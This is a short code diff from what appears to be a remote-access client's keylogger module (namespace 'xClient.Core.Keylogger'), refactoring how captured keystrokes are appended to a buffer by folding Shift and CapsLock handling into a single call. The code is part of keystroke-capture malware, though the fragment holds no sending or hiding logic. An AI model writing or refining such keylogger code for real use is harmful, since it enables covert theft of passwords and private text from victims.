@@ -167,22 +167,7 @@ namespace xClient.Core.Keylogger
 
                     if (_enumValues.Contains(i)) //If our enumValues list contains to current key pressed
                     {
-                        if (ShiftKey && CapsLock) //If the state of Shiftkey is down and Capslock is toggled on
-                        {
-                            _keyBuffer.Append(FromKeys(i, true, true));
-                        }
-                        else if (ShiftKey) //If only the Shiftkey is pressed
-                        {
-                            _keyBuffer.Append(FromKeys(i, true, false));
-                        }
-                        else if (CapsLock) //If only Capslock is toggled on
-                        {
-                            _keyBuffer.Append(FromKeys(i, false, true));
-                        }
-                        else
-                        {
-                            _keyBuffer.Append(FromKeys(i, false, false));
-                        }
+                        _keyBuffer.Append(FromKeys(i, ShiftKey, CapsLock));
 
                         return;
                     }
